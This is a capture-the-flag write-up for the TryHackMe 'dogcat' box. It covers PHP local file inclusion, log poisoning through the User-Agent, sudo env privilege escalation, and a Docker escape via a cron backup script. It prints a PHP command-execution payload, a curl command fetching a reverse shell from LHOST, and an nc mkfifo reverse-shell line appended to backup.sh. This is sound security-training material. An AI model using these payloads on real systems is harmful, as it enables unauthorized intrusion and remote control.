---
title: dogcat
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 21
---

# dogcat

<img width="918" height="244" alt="image" src="https://github.com/user-attachments/assets/38d26c5e-8a7d-4db5-8759-40b9301c1550" />

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

## Recon
As always I start off with ```nmap -sC -sV -vv ip``` on the target box. This scan revealed that the target box has a webserver running on ```port 80``` and ssh on ```port 20```.

<img width="569" height="268" alt="image" src="https://github.com/user-attachments/assets/088ede85-b450-401d-a368-1cd78f540bad" />

Visiting the webpage via Firefox, we are greeted by a webpage that shows you a picture of a dog or a cat. Thopugh something interesting I noticed is the ```?view=``` parameter in the url which may be indicative of LFI or RFI.

<img width="1324" height="795" alt="image" src="https://github.com/user-attachments/assets/8df3833e-2f62-4a7b-a88f-6e32204470e9" />

After doing some research, I discovered that since this is a php website, we can abuse a buit in php filter (```php://filter/convert.base64-encode/resource=index```) so that instead of executing the php file we get the base64 string of the source code of the php file.

This article [here](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html) explains it better.

I was able to get the b64 strings of the source of dog and cat but theyw ere just php files that randomly chose 1-10 images which isnt what i want, i want the source core functionality.

After being stumped, I discovered that I could use directory traversal to access cat while on dog ```?view=dog/../cat```.

So using this, I tried to use the filter with the paramter of ```dog/../index``` and i got the b64 string of the source code which is decoded below.

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
ýØ¯
```

I noticed that the $ext variable kept appending .phpm to any query so by altering the url with ```&ext=``` it nulled out the ext variable and allowed me to read any file I wanted.

<img width="1326" height="671" alt="image" src="https://github.com/user-attachments/assets/18bffd82-7d32-4e24-b77c-bbfdf51a4aef" />

I haven't really done much LFI, so a lot of research was needed, but I discovered a technique called log poisoning. 

This excerpt is an example of log poisoning via hackviser.

```php
# Apache/Nginx Access Log
# Step 1: Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include access log
page=../../../var/log/apache2/access.log&cmd=whoami
```
[Hackviser article](https://hackviser.com/tactics/pentesting/web/lfi-rfi)

So I searched for the apache log file as the nmap scan revealed this was an apache server.

<img width="1411" height="951" alt="image" src="https://github.com/user-attachments/assets/37c85cfb-1c23-47e4-a7d4-4732a9299cf3" />

I then used the curl cmd shown above and was able to obtain the ```&cmd=``` 'rce'.

Once I knew I ahd rce, I immediately tried to get a reverse shell. 

At the end of the url i did ```&cmd=curl http://LHOST:80/reverse-shell.php -o /tmp/shell.php``` and my http server successfully served the content to the webserver.

I naviagted to ```/tmp/shell.php``` using the LFI vulnerability, got a callback, and got flag1, nice.

### Inside the Shell

To find the locations of all the flags, I ran ```find / -name "flag*" 2>/dev/null``` and found the locations of the next two flags: one in /var/www/ and one in /root.

I ran ```sudo -l``` and found that I could run /usr/bin/env with no password as su.

I searched gtfobins and found a matching [entry](https://gtfobins.org/gtfobins/env/#shell), score.


#### priv esc

I went back to my shell and typed ```sudo /usr/bin/env /bin/sh```, got root privileges, went to root and got flag3, nice.

But where is flag4??

Looking around I found a .dockerenv file which means we are in a docker container. 

Looking around some more, I find 2 files called backup.tar and backup.sh.

it looks like backup.sh is using tar to create a backup of the container?

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

I cant navigate to the ```/root/container``` directory so I must be in the docker container and that must be a crontab ran on the host machine. If I add a reverse shell to that script, I could potentially get a reverse shell on the host machine outside of the container.

###Breaking out the docker container

I ran the command 

```bash
echo '#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f' >> backup.sh
```

I set up a listener and then waited a little...... and some more.......

And finally got a callback on the host machine outside the docker container, and got flag4, nice.

<img width="650" height="362" alt="image" src="https://github.com/user-attachments/assets/3417ca7b-488e-46eb-b5df-6d2d392622b3" />

---

## Solution Steps

1. Use LFI to read apache access logs
2. perform log poisoning by injecting php code into the user-agent
3. downlaod a reverse shell and save it to the tmp directory via ```&cmd=```
4. perform ```sudo env /bin/sh``` to get root in the container
5. Append ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f``` to ```backup.sh``` in hopes its a crontab
6. Get a callback on your listener and have root on the host machine


## Thoughts
I thought this box was very interesting. I have had almost zero practice with LFI so Im glad I got to use this box to really drill in the concept and learn about novel attack paths with LFI such as log poisoning. I also really enjoyed how unique this box was as well in the sense that we were in a docker container and had to break out of it to the host machine using the backup.sh script and deciphering that since /root/container cant be accesse through the docker container, it must be a crontab (hopefully) on the host machine. Really fun box.

---

Thank you for reading!

